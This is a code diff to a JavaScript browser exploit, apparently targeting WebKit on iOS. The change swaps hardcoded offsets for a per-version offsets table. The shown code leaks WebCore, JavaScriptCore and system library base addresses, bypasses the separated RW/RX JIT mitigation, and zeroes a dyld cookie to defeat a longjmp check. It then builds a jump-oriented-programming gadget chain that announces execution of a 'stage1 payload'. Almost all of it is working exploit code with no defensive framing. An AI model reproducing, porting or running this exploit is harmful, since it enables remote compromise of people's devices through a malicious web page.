@@ -106,6 +106,8 @@ function setup_addrof_fakeobj() {
 }
 
 function pwn() {
+    offsets.resolve();
+
      let [raw_addrof, raw_fakeobj] = setup_addrof_fakeobj();
 
     // Convenience wrappers to use Int64
@@ -208,51 +210,51 @@ function pwn() {
     log(`[*] vtab_addr = ${(vtab_addr)}`);
 
     // Libs Base
-    var webcore_base = Sub(vtab_addr, 0x187f75c);
+    var webcore_base = Sub(vtab_addr, offsets.WEBCORE_BASE);
     log(`[+] webcore base = ${(webcore_base)} -> ${read64(webcore_base)}`);
-    var jsc_base = Sub(webcore_base, 0x1738000);
+    var jsc_base = Sub(webcore_base, offsets.JSC_BASE);
     log(`[+] jsc base = ${(jsc_base)} -> ${read64(jsc_base)}`); 
-    var coreaudio_base = Sub(webcore_base, 0x5573000);
+    var coreaudio_base = Sub(webcore_base, offsets.COREAUDIO_BASE);
     log(`[+] coreaudio base = ${(coreaudio_base)} -> ${read64(coreaudio_base)}`); 
-    var libcpp1_base = Sub(webcore_base, 0x976C000);
+    var libcpp1_base = Sub(webcore_base, offsets.LIBCPP1_BASE);
     log(`[+] libcpp1 base = ${(libcpp1_base)} -> ${read64(libcpp1_base)}`); 
-    var libsystem_platform_base = Sub(webcore_base, 0x8CCE000);
+    var libsystem_platform_base = Sub(webcore_base, offsets.LIBSYSTEM_PLATFORM_BASE);
     log(`[+] libsystem_platform base = ${(libsystem_platform_base)} -> ${read64(libsystem_platform_base)}`);
-    var libsystem_kernel_base = Sub(webcore_base, 0x8D5D000);
+    var libsystem_kernel_base = Sub(webcore_base, offsets.LIBSYSTEM_KERNEL_BASE);
     log(`[+] libsystem_kernel base = ${(libsystem_kernel_base)} -> ${read64(libsystem_kernel_base)}`);
-    var libdyld_base = Sub(webcore_base, 0x8E88000);
+    var libdyld_base = Sub(webcore_base, offsets.LIBDYLD_BASE);
     log(`[+] libdyld base = ${(libdyld_base)} -> ${read64(libdyld_base)}`);
 
     // needed to bypass seperated RW, RX JIT mitigation
-    var __MergedGlobals_52 = read64(Add(jsc_base, 0x32559040));
-    var memPoolStart = read64(Add(__MergedGlobals_52, 0xc8));    //__MergedGlobals_52 + 0xc8
-    var memPoolEnd = read64(Add(__MergedGlobals_52, 0xd0));      //__MergedGlobals_52 + 0xd0
-    var jitWriteSeparateHeaps = read64(Add(jsc_base, 0x3255A438));  //__ZN3JSC29jitWriteSeparateHeapsFunctionE
+    var __MergedGlobals_52 = read64(Add(jsc_base, offsets.__MergedGlobals_52));
+    var memPoolStart = read64(Add(__MergedGlobals_52, offsets.memPoolStart));    //__MergedGlobals_52 + 0xc8
+    var memPoolEnd = read64(Add(__MergedGlobals_52, offsets.memPoolEnd));      //__MergedGlobals_52 + 0xd0
+    var jitWriteSeparateHeaps = read64(Add(jsc_base, offsets.jitWriteSeparateHeaps));  //__ZN3JSC29jitWriteSeparateHeapsFunctionE
     log(`[i] memPoolStart = ${memPoolStart}`);
     log(`[i] memPoolEnd = ${memPoolEnd}`);
     log(`[i] jitWriteSeparateHeaps = ${jitWriteSeparateHeaps}`);
-    var longjmp = Add(libsystem_platform_base, 0x16f8);
-    var usleep = Add(webcore_base, 0x1810BA4);
-    var mach_vm_protect = Add(libsystem_kernel_base, 0x2156c);
-    var mach_task_self_ = read64(Add(libsystem_kernel_base, 0x39AD1AAC));
+    var longjmp = Add(libsystem_platform_base, offsets.longjmp);
+    var usleep = Add(webcore_base, offsets.usleep);
+    var mach_vm_protect = Add(libsystem_kernel_base, offsets.mach_vm_protect);
+    var mach_task_self_ = read64(Add(libsystem_kernel_base, offsets.mach_task_self_));
 
     // longjmp mitigation?; nullify when read *(uint64_t *)(_ReadStatusReg(TPIDRRO_EL0) + 0x38);
-    var __ZZ6dlopenE1p = read64(Add(libdyld_base, 0x39BFA9E8));
+    var __ZZ6dlopenE1p = read64(Add(libdyld_base, offsets.__ZZ6dlopenE1p));
     log(`[i] __ZZ6dlopenE1p = ${__ZZ6dlopenE1p}`);
-    var dyld_base = Sub(__ZZ6dlopenE1p, 0xc918); //_dlopen_internal = 0xc918
+    var dyld_base = Sub(__ZZ6dlopenE1p, offsets.dlopen_internal); //_dlopen_internal = 0xc918
     log(`[i] dyld_base = ${dyld_base}`);
-    var cookieAddr = Add(dyld_base, 0x8ECA0 + 0x38);
+    var cookieAddr = Add(dyld_base, offsets.cookieAddr);
     log(`[i] read cookie  = ${read64(cookieAddr)}`);
     write64(cookieAddr, new Int64(0));
     log(`[i] writechk  = ${read64(cookieAddr)}`);
 
 
     //gadgets
-    var stackloader = Add(webcore_base, 0x9594); //v FD 7B 46 A9 F4 4F 45 A9 F6 57 44 A9 F8 5F 43 A9 FA 67 42 A9 FC 6F 41 A9 FF C3 01 91 C0 03 5F D6 
-    var ldrx8 = Add(webcore_base, 0x185AB8);    //v E8 03 40 F9 68 02 00 F9 FD 7B 42 A9 F4 4F 41 A9 FF C3 00 91 C0 03 5F D6 
-    var dispatch = Add(coreaudio_base, 0x100F54)   //v A0 02 3F D6 FD 7B 43 A9 F4 4F 42 A9 F6 57 41 A9 FF 03 01 91 C0 03 5F D6
-    var movx4 = Add(webcore_base, 0x861F08);    //v E4 03 14 AA 00 01 3F D6 
-    var regloader = Add(libcpp1_base, 0x25D18); //v E3 03 16 AA E6 03 1B AA E0 03 18 AA E1 03 13 AA E2 03 17 AA E4 03 40 F9 00 01 3F D6
+    var stackloader = Add(webcore_base, offsets.stackloader); //v FD 7B 46 A9 F4 4F 45 A9 F6 57 44 A9 F8 5F 43 A9 FA 67 42 A9 FC 6F 41 A9 FF C3 01 91 C0 03 5F D6 
+    var ldrx8 = Add(webcore_base, offsets.ldrx8);    //v E8 03 40 F9 68 02 00 F9 FD 7B 42 A9 F4 4F 41 A9 FF C3 00 91 C0 03 5F D6 
+    var dispatch = Add(coreaudio_base, offsets.dispatch)   //v A0 02 3F D6 FD 7B 43 A9 F4 4F 42 A9 F6 57 41 A9 FF 03 01 91 C0 03 5F D6
+    var movx4 = Add(webcore_base, offsets.movx4);    //v E4 03 14 AA 00 01 3F D6 
+    var regloader = Add(libcpp1_base, offsets.regloader); //v E3 03 16 AA E6 03 1B AA E0 03 18 AA E1 03 13 AA E2 03 17 AA E4 03 40 F9 00 01 3F D6
 
     // JOP START !!!
     var x19 = malloc(0x100);
@@ -549,7 +551,7 @@ function pwn() {
     var sp = Add(stack, (arrsz - off) * 4);
     write64(Add(x19, 0x60), new Int64(sp));
 
-    alert(1);
+    alert("Done building JOP chain, executing stage1 payload!");
 
     wrapper.addEventListener("click", function(){ }); 
 
